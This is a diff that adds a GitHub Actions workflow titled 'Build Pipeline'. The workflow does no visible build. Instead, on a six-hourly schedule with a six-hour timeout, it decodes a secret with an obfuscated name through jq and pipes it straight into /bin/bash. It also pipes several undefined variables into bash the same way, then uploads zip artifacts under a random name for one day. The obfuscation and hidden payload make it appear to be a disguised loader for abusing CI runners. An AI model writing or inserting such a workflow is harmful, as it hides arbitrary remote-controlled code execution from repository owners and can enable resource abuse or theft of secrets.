@@ -1,0 +1,30 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '40 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Deploy
+        env:
+          lyx293: ${{ secrets.lyx293 }}
+        run: |
+          printf '%s' "$lyx293" | jq -r .uuv9 | /bin/bash
+          echo $pq20120 | jq -r .zzz935 | /bin/bash
+          printf '%s' "$knfq081" | jq -r .hjgwu13520 | /bin/bash
+          echo $y3 | jq -r .u1566 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: wiuew6jL
+          path: "*.zip"
+          retention-days: 1
